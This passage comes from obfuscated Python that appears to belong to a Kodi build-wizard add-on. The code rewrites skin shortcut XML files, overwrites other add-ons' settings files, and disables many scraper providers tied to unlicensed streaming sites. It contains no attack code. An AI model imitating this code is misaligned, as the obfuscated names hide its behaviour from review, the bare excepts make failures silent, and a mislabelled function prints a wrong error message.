    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1215
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1216
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1234
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1237
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1238
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1242
    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1243
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1244
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1262
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1265
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1266
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1270
    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1271
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1272
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1290
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1293
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1294
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1297
    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1298
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1299
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1317
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1320
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1321
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1323
    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1324
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1325
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1343
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1346
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1347
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1349
    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1350
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1351
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1369
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1372
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1373
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1376
    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1377
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1378
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1396
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1399
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1400
def rdbuildinstallON ():#line:1403
    try :#line:1405
       OO00OO000OOO00O00 =ADDONPATH +"/resources/rd/victory.xml"#line:1406
       OOO0OOO0OO0OOOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1407
       copyfile (OO00OO000OOO00O00 ,OOO0OOO0OO0OOOO00 )#line:1409
       OO00OO000OOO00O00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1411
       OOO0OOO0OO0OOOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1412
       copyfile (OO00OO000OOO00O00 ,OOO0OOO0OO0OOOO00 )#line:1414
       OO00OO000OOO00O00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1416
       OOO0OOO0OO0OOOO00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1417
       copyfile (OO00OO000OOO00O00 ,OOO0OOO0OO0OOOO00 )#line:1419
       OO00OO000OOO00O00 =ADDONPATH +"/resources/rd/Splash.png"#line:1422
       OOO0OOO0OO0OOOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1423
       copyfile (OO00OO000OOO00O00 ,OOO0OOO0OO0OOOO00 )#line:1425
    except :#line:1427
       pass #line:1428
def rdbuild ():#line:1438
	O000OO000O00OOOOO =(ADDON .getSetting ("auto_rd"))#line:1439
	if O000OO000O00OOOOO =='true':#line:1440
		O0O000OOOO0OOOOOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1441
		O0O000OOOO0OOOOOO .setSetting ('all_t','0')#line:1442
		O0O000OOOO0OOOOOO .setSetting ('rd_menu_enable','false')#line:1443
		O0O000OOOO0OOOOOO .setSetting ('magnet_bay','false')#line:1444
		O0O000OOOO0OOOOOO .setSetting ('magnet_extra','false')#line:1445
		O0O000OOOO0OOOOOO .setSetting ('rd_only','false')#line:1446
		O0O000OOOO0OOOOOO .setSetting ('ftp','false')#line:1448
		O0O000OOOO0OOOOOO .setSetting ('fp','false')#line:1449
		O0O000OOOO0OOOOOO .setSetting ('filter_fp','false')#line:1450
		O0O000OOOO0OOOOOO .setSetting ('fp_size_en','false')#line:1451
		O0O000OOOO0OOOOOO .setSetting ('afdah','false')#line:1452
		O0O000OOOO0OOOOOO .setSetting ('ap2s','false')#line:1453
		O0O000OOOO0OOOOOO .setSetting ('cin','false')#line:1454
		O0O000OOOO0OOOOOO .setSetting ('clv','false')#line:1455
		O0O000OOOO0OOOOOO .setSetting ('cmv','false')#line:1456
		O0O000OOOO0OOOOOO .setSetting ('dl20','false')#line:1457
		O0O000OOOO0OOOOOO .setSetting ('esc','false')#line:1458
		O0O000OOOO0OOOOOO .setSetting ('extra','false')#line:1459
		O0O000OOOO0OOOOOO .setSetting ('film','false')#line:1460
		O0O000OOOO0OOOOOO .setSetting ('fre','false')#line:1461
		O0O000OOOO0OOOOOO .setSetting ('fxy','false')#line:1462
		O0O000OOOO0OOOOOO .setSetting ('genv','false')#line:1463
		O0O000OOOO0OOOOOO .setSetting ('getgo','false')#line:1464
		O0O000OOOO0OOOOOO .setSetting ('gold','false')#line:1465
		O0O000OOOO0OOOOOO .setSetting ('gona','false')#line:1466
		O0O000OOOO0OOOOOO .setSetting ('hdmm','false')#line:1467
		O0O000OOOO0OOOOOO .setSetting ('hdt','false')#line:1468
		O0O000OOOO0OOOOOO .setSetting ('icy','false')#line:1469
		O0O000OOOO0OOOOOO .setSetting ('ind','false')#line:1470
		O0O000OOOO0OOOOOO .setSetting ('iwi','false')#line:1471
		O0O000OOOO0OOOOOO .setSetting ('jen_free','false')#line:1472
		O0O000OOOO0OOOOOO .setSetting ('kiss','false')#line:1473
		O0O000OOOO0OOOOOO .setSetting ('lavin','false')#line:1474
		O0O000OOOO0OOOOOO .setSetting ('los','false')#line:1475
		O0O000OOOO0OOOOOO .setSetting ('m4u','false')#line:1476
		O0O000OOOO0OOOOOO .setSetting ('mesh','false')#line:1477
		O0O000OOOO0OOOOOO .setSetting ('mf','false')#line:1478
		O0O000OOOO0OOOOOO .setSetting ('mkvc','false')#line:1479
		O0O000OOOO0OOOOOO .setSetting ('mjy','false')#line:1480
		O0O000OOOO0OOOOOO .setSetting ('hdonline','false')#line:1481
		O0O000OOOO0OOOOOO .setSetting ('moviex','false')#line:1482
		O0O000OOOO0OOOOOO .setSetting ('mpr','false')#line:1483
		O0O000OOOO0OOOOOO .setSetting ('mvg','false')#line:1484
		O0O000OOOO0OOOOOO .setSetting ('mvl','false')#line:1485
		O0O000OOOO0OOOOOO .setSetting ('mvs','false')#line:1486
		O0O000OOOO0OOOOOO .setSetting ('myeg','false')#line:1487
		O0O000OOOO0OOOOOO .setSetting ('ninja','false')#line:1488
		O0O000OOOO0OOOOOO .setSetting ('odb','false')#line:1489
		O0O000OOOO0OOOOOO .setSetting ('ophd','false')#line:1490
		O0O000OOOO0OOOOOO .setSetting ('pks','false')#line:1491
		O0O000OOOO0OOOOOO .setSetting ('prf','false')#line:1492
		O0O000OOOO0OOOOOO .setSetting ('put18','false')#line:1493
		O0O000OOOO0OOOOOO .setSetting ('req','false')#line:1494
		O0O000OOOO0OOOOOO .setSetting ('rftv','false')#line:1495
		O0O000OOOO0OOOOOO .setSetting ('rltv','false')#line:1496
		O0O000OOOO0OOOOOO .setSetting ('sc','false')#line:1497
		O0O000OOOO0OOOOOO .setSetting ('seehd','false')#line:1498
		O0O000OOOO0OOOOOO .setSetting ('showbox','false')#line:1499
		O0O000OOOO0OOOOOO .setSetting ('shuid','false')#line:1500
		O0O000OOOO0OOOOOO .setSetting ('sil_gh','false')#line:1501
		O0O000OOOO0OOOOOO .setSetting ('spv','false')#line:1502
		O0O000OOOO0OOOOOO .setSetting ('subs','false')#line:1503
		O0O000OOOO0OOOOOO .setSetting ('tvs','false')#line:1504
		O0O000OOOO0OOOOOO .setSetting ('tw','false')#line:1505
		O0O000OOOO0OOOOOO .setSetting ('upto','false')#line:1506
		O0O000OOOO0OOOOOO .setSetting ('vel','false')#line:1507
		O0O000OOOO0OOOOOO .setSetting ('vex','false')#line:1508
		O0O000OOOO0OOOOOO .setSetting ('vidc','false')#line:1509
		O0O000OOOO0OOOOOO .setSetting ('w4hd','false')#line:1510
		O0O000OOOO0OOOOOO .setSetting ('wav','false')#line:1511
		O0O000OOOO0OOOOOO .setSetting ('wf','false')#line:1512
		O0O000OOOO0OOOOOO .setSetting ('wse','false')#line:1513
		O0O000OOOO0OOOOOO .setSetting ('wss','false')#line:1514
		O0O000OOOO0OOOOOO .setSetting ('wsse','false')#line:1515
		O0O000OOOO0OOOOOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1516
		O0O000OOOO0OOOOOO .setSetting ('debrid.only','true')#line:1517
		O0O000OOOO0OOOOOO .setSetting ('hosts.captcha','false')#line:1518
		O0O000OOOO0OOOOOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1519
		O0O000OOOO0OOOOOO .setSetting ('provider.123moviehd','false')#line:1520
		O0O000OOOO0OOOOOO .setSetting ('provider.300mbdownload','false')#line:1521
		O0O000OOOO0OOOOOO .setSetting ('provider.alltube','false')#line:1522
		O0O000OOOO0OOOOOO .setSetting ('provider.allucde','false')#line:1523
		O0O000OOOO0OOOOOO .setSetting ('provider.animebase','false')#line:1524
		O0O000OOOO0OOOOOO .setSetting ('provider.animeloads','false')#line:1525
		O0O000OOOO0OOOOOO .setSetting ('provider.animetoon','false')#line:1526
		O0O000OOOO0OOOOOO .setSetting ('provider.bnwmovies','false')#line:1527
		O0O000OOOO0OOOOOO .setSetting ('provider.boxfilm','false')#line:1528
		O0O000OOOO0OOOOOO .setSetting ('provider.bs','false')#line:1529
		O0O000OOOO0OOOOOO .setSetting ('provider.cartoonhd','false')#line:1530
		O0O000OOOO0OOOOOO .setSetting ('provider.cdahd','false')#line:1531
		O0O000OOOO0OOOOOO .setSetting ('provider.cdax','false')#line:1532
		O0O000OOOO0OOOOOO .setSetting ('provider.cine','false')#line:1533
		O0O000OOOO0OOOOOO .setSetting ('provider.cinenator','false')#line:1534
		O0O000OOOO0OOOOOO .setSetting ('provider.cmovieshdbz','false')#line:1535
		O0O000OOOO0OOOOOO .setSetting ('provider.coolmoviezone','false')#line:1536
		O0O000OOOO0OOOOOO .setSetting ('provider.ddl','false')#line:1537
		O0O000OOOO0OOOOOO .setSetting ('provider.deepmovie','false')#line:1538
		O0O000OOOO0OOOOOO .setSetting ('provider.ekinomaniak','false')#line:1539
		O0O000OOOO0OOOOOO .setSetting ('provider.ekinotv','false')#line:1540
		O0O000OOOO0OOOOOO .setSetting ('provider.filiser','false')#line:1541
		O0O000OOOO0OOOOOO .setSetting ('provider.filmpalast','false')#line:1542
		O0O000OOOO0OOOOOO .setSetting ('provider.filmwebbooster','false')#line:1543
		O0O000OOOO0OOOOOO .setSetting ('provider.filmxy','false')#line:1544
		O0O000OOOO0OOOOOO .setSetting ('provider.fmovies','false')#line:1545
		O0O000OOOO0OOOOOO .setSetting ('provider.foxx','false')#line:1546
		O0O000OOOO0OOOOOO .setSetting ('provider.freefmovies','false')#line:1547
		O0O000OOOO0OOOOOO .setSetting ('provider.freeputlocker','false')#line:1548
		O0O000OOOO0OOOOOO .setSetting ('provider.furk','false')#line:1549
		O0O000OOOO0OOOOOO .setSetting ('provider.gamatotv','false')#line:1550
		O0O000OOOO0OOOOOO .setSetting ('provider.gogoanime','false')#line:1551
		O0O000OOOO0OOOOOO .setSetting ('provider.gowatchseries','false')#line:1552
		O0O000OOOO0OOOOOO .setSetting ('provider.hackimdb','false')#line:1553
		O0O000OOOO0OOOOOO .setSetting ('provider.hdfilme','false')#line:1554
		O0O000OOOO0OOOOOO .setSetting ('provider.hdmto','false')#line:1555
		O0O000OOOO0OOOOOO .setSetting ('provider.hdpopcorns','false')#line:1556
		O0O000OOOO0OOOOOO .setSetting ('provider.hdstreams','false')#line:1557
		O0O000OOOO0OOOOOO .setSetting ('provider.horrorkino','false')#line:1559
		O0O000OOOO0OOOOOO .setSetting ('provider.iitv','false')#line:1560
		O0O000OOOO0OOOOOO .setSetting ('provider.iload','false')#line:1561
		O0O000OOOO0OOOOOO .setSetting ('provider.iwaatch','false')#line:1562
		O0O000OOOO0OOOOOO .setSetting ('provider.kinodogs','false')#line:1563
		O0O000OOOO0OOOOOO .setSetting ('provider.kinoking','false')#line:1564
		O0O000OOOO0OOOOOO .setSetting ('provider.kinow','false')#line:1565
		O0O000OOOO0OOOOOO .setSetting ('provider.kinox','false')#line:1566
		O0O000OOOO0OOOOOO .setSetting ('provider.lichtspielhaus','false')#line:1567
		O0O000OOOO0OOOOOO .setSetting ('provider.liomenoi','false')#line:1568
		O0O000OOOO0OOOOOO .setSetting ('provider.magnetdl','false')#line:1571
		O0O000OOOO0OOOOOO .setSetting ('provider.megapelistv','false')#line:1572
		O0O000OOOO0OOOOOO .setSetting ('provider.movie2k-ac','false')#line:1573
		O0O000OOOO0OOOOOO .setSetting ('provider.movie2k-ag','false')#line:1574
		O0O000OOOO0OOOOOO .setSetting ('provider.movie2z','false')#line:1575
		O0O000OOOO0OOOOOO .setSetting ('provider.movie4k','false')#line:1576
		O0O000OOOO0OOOOOO .setSetting ('provider.movie4kis','false')#line:1577
		O0O000OOOO0OOOOOO .setSetting ('provider.movieneo','false')#line:1578
		O0O000OOOO0OOOOOO .setSetting ('provider.moviesever','false')#line:1579
		O0O000OOOO0OOOOOO .setSetting ('provider.movietown','false')#line:1580
		O0O000OOOO0OOOOOO .setSetting ('provider.mvrls','false')#line:1582
		O0O000OOOO0OOOOOO .setSetting ('provider.netzkino','false')#line:1583
		O0O000OOOO0OOOOOO .setSetting ('provider.odb','false')#line:1584
		O0O000OOOO0OOOOOO .setSetting ('provider.openkatalog','false')#line:1585
		O0O000OOOO0OOOOOO .setSetting ('provider.ororo','false')#line:1586
		O0O000OOOO0OOOOOO .setSetting ('provider.paczamy','false')#line:1587
		O0O000OOOO0OOOOOO .setSetting ('provider.peliculasdk','false')#line:1588
		O0O000OOOO0OOOOOO .setSetting ('provider.pelisplustv','false')#line:1589
		O0O000OOOO0OOOOOO .setSetting ('provider.pepecine','false')#line:1590
		O0O000OOOO0OOOOOO .setSetting ('provider.primewire','false')#line:1591
		O0O000OOOO0OOOOOO .setSetting ('provider.projectfreetv','false')#line:1592
		O0O000OOOO0OOOOOO .setSetting ('provider.proxer','false')#line:1593
		O0O000OOOO0OOOOOO .setSetting ('provider.pureanime','false')#line:1594
		O0O000OOOO0OOOOOO .setSetting ('provider.putlocker','false')#line:1595
		O0O000OOOO0OOOOOO .setSetting ('provider.putlockerfree','false')#line:1596
		O0O000OOOO0OOOOOO .setSetting ('provider.reddit','false')#line:1597
		O0O000OOOO0OOOOOO .setSetting ('provider.cartoonwire','false')#line:1598
		O0O000OOOO0OOOOOO .setSetting ('provider.seehd','false')#line:1599
		O0O000OOOO0OOOOOO .setSetting ('provider.segos','false')#line:1600
		O0O000OOOO0OOOOOO .setSetting ('provider.serienstream','false')#line:1601
		O0O000OOOO0OOOOOO .setSetting ('provider.series9','false')#line:1602
		O0O000OOOO0OOOOOO .setSetting ('provider.seriesever','false')#line:1603
		O0O000OOOO0OOOOOO .setSetting ('provider.seriesonline','false')#line:1604
		O0O000OOOO0OOOOOO .setSetting ('provider.seriespapaya','false')#line:1605
		O0O000OOOO0OOOOOO .setSetting ('provider.sezonlukdizi','false')#line:1606
		O0O000OOOO0OOOOOO .setSetting ('provider.solarmovie','false')#line:1607
		O0O000OOOO0OOOOOO .setSetting ('provider.solarmoviez','false')#line:1608
		O0O000OOOO0OOOOOO .setSetting ('provider.stream-to','false')#line:1609
		O0O000OOOO0OOOOOO .setSetting ('provider.streamdream','false')#line:1610
		O0O000OOOO0OOOOOO .setSetting ('provider.streamflix','false')#line:1611
		O0O000OOOO0OOOOOO .setSetting ('provider.streamit','false')#line:1612
		O0O000OOOO0OOOOOO .setSetting ('provider.swatchseries','false')#line:1613
		O0O000OOOO0OOOOOO .setSetting ('provider.szukajkatv','false')#line:1614
		O0O000OOOO0OOOOOO .setSetting ('provider.tainiesonline','false')#line:1615
		O0O000OOOO0OOOOOO .setSetting ('provider.tainiomania','false')#line:1616
		O0O000OOOO0OOOOOO .setSetting ('provider.tata','false')#line:1619
		O0O000OOOO0OOOOOO .setSetting ('provider.trt','false')#line:1620
		O0O000OOOO0OOOOOO .setSetting ('provider.tvbox','false')#line:1621
		O0O000OOOO0OOOOOO .setSetting ('provider.ultrahd','false')#line:1622
		O0O000OOOO0OOOOOO .setSetting ('provider.video4k','false')#line:1623
		O0O000OOOO0OOOOOO .setSetting ('provider.vidics','false')#line:1624
		O0O000OOOO0OOOOOO .setSetting ('provider.view4u','false')#line:1625
		O0O000OOOO0OOOOOO .setSetting ('provider.watchseries','false')#line:1626
		O0O000OOOO0OOOOOO .setSetting ('provider.xrysoi','false')#line:1627
		O0O000OOOO0OOOOOO .setSetting ('provider.library','false')#line:1628
def fixfont ():#line:1631
	OO0O000000O00OOOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1632
	O000OO00OO0OOOOO0 =json .loads (OO0O000000O00OOOO );#line:1634
	O0O0O0O0OO0000O00 =O000OO00OO0OOOOO0 ["result"]["settings"]#line:1635
	O0O00O0OOO0O0OO00 =[O0OOO00O000OOOO0O for O0OOO00O000OOOO0O in O0O0O0O0OO0000O00 if O0OOO00O000OOOO0O ["id"]=="audiooutput.audiodevice"][0 ]#line:1637
	OOO000O000O0OO0O0 =O0O00O0OOO0O0OO00 ["options"];#line:1638
	OOOO0OOOO00O000OO =O0O00O0OOO0O0OO00 ["value"];#line:1639
	OOO0OOOO0OOOOO0O0 =[OO0O000OOOOOOO0OO for (OO0O000OOOOOOO0OO ,O0OO00000O00OO000 )in enumerate (OOO000O000O0OO0O0 )if O0OO00000O00OO000 ["value"]==OOOO0OOOO00O000OO ][0 ];#line:1641
	OOO0OOOO0OO00OO0O =(OOO0OOOO0OOOOO0O0 +1 )%len (OOO000O000O0OO0O0 )#line:1643
	OOOO0000OOOOOO0OO =OOO000O000O0OO0O0 [OOO0OOOO0OO00OO0O ]["value"]#line:1645
	OO0OOO0O0OO00O0OO =OOO000O000O0OO0O0 [OOO0OOOO0OO00OO0O ]["label"]#line:1646
	O000OOOO0O00000OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1648
	try :#line:1650
		O0OOOOOOOOO000O00 =json .loads (O000OOOO0O00000OO );#line:1651
		if O0OOOOOOOOO000O00 ["result"]!=True :#line:1653
			raise Exception #line:1654
	except :#line:1655
		sys .stderr .write ("Error switching audio output device")#line:1656
		raise Exception #line:1657
def parseDOM2 (O0O00OOOO0O0OO0O0 ,name =u"",attrs ={},ret =False ):#line:1658
	if isinstance (O0O00OOOO0O0OO0O0 ,str ):#line:1661
		try :#line:1662
			O0O00OOOO0O0OO0O0 =[O0O00OOOO0O0OO0O0 .decode ("utf-8")]#line:1663
		except :#line:1664
			O0O00OOOO0O0OO0O0 =[O0O00OOOO0O0OO0O0 ]#line:1665
	elif isinstance (O0O00OOOO0O0OO0O0 ,unicode ):#line:1666
		O0O00OOOO0O0OO0O0 =[O0O00OOOO0O0OO0O0 ]#line:1667
	elif not isinstance (O0O00OOOO0O0OO0O0 ,list ):#line:1668
		return u""#line:1669
	if not name .strip ():#line:1671
		return u""#line:1672
	OOOOO00000O00OOOO =[]#line:1674
	for O0000OOO0O0OO000O in O0O00OOOO0O0OO0O0 :#line:1675
		OO0O0O0O0O0OOOO0O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0000OOO0O0OO000O )#line:1676
		for O0O0O00OOO0O0O0OO in OO0O0O0O0O0OOOO0O :#line:1677
			O0000OOO0O0OO000O =O0000OOO0O0OO000O .replace (O0O0O00OOO0O0O0OO ,O0O0O00OOO0O0O0OO .replace ("\n"," "))#line:1678
		O000O0O00OOOO0O0O =[]#line:1680
		for OOO0OOOO000O0O00O in attrs :#line:1681
			OO00OO000OOOOOOOO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0OOOO000O0O00O +'=[\'"]'+attrs [OOO0OOOO000O0O00O ]+'[\'"].*?>))',re .M |re .S ).findall (O0000OOO0O0OO000O )#line:1682
			if len (OO00OO000OOOOOOOO )==0 and attrs [OOO0OOOO000O0O00O ].find (" ")==-1 :#line:1683
				OO00OO000OOOOOOOO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0OOOO000O0O00O +'='+attrs [OOO0OOOO000O0O00O ]+'.*?>))',re .M |re .S ).findall (O0000OOO0O0OO000O )#line:1684
			if len (O000O0O00OOOO0O0O )==0 :#line:1686
				O000O0O00OOOO0O0O =OO00OO000OOOOOOOO #line:1687
				OO00OO000OOOOOOOO =[]#line:1688
			else :#line:1689
				OO0O0O0OOOOO0OOOO =range (len (O000O0O00OOOO0O0O ))#line:1690
				OO0O0O0OOOOO0OOOO .reverse ()#line:1691
				for OO00O0000OOO0OOOO in OO0O0O0OOOOO0OOOO :#line:1692
					if not O000O0O00OOOO0O0O [OO00O0000OOO0OOOO ]in OO00OO000OOOOOOOO :#line:1693
						del (O000O0O00OOOO0O0O [OO00O0000OOO0OOOO ])#line:1694
		if len (O000O0O00OOOO0O0O )==0 and attrs =={}:#line:1696
			O000O0O00OOOO0O0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0000OOO0O0OO000O )#line:1697
			if len (O000O0O00OOOO0O0O )==0 :#line:1698
				O000O0O00OOOO0O0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0000OOO0O0OO000O )#line:1699
		if isinstance (ret ,str ):#line:1701
			OO00OO000OOOOOOOO =[]#line:1702
			for O0O0O00OOO0O0O0OO in O000O0O00OOOO0O0O :#line:1703
				OOOOO0O0OOO0OOOO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0O0O00OOO0O0O0OO )#line:1704
				if len (OOOOO0O0OOO0OOOO0 )==0 :#line:1705
					OOOOO0O0OOO0OOOO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0O0O00OOO0O0O0OO )#line:1706
				for OO0OO00O00OO0O000 in OOOOO0O0OOO0OOOO0 :#line:1707
					OOOO00O0OO000OOOO =OO0OO00O00OO0O000 [0 ]#line:1708
					if OOOO00O0OO000OOOO in "'\"":#line:1709
						if OO0OO00O00OO0O000 .find ('='+OOOO00O0OO000OOOO ,OO0OO00O00OO0O000 .find (OOOO00O0OO000OOOO ,1 ))>-1 :#line:1710
							OO0OO00O00OO0O000 =OO0OO00O00OO0O000 [:OO0OO00O00OO0O000 .find ('='+OOOO00O0OO000OOOO ,OO0OO00O00OO0O000 .find (OOOO00O0OO000OOOO ,1 ))]#line:1711
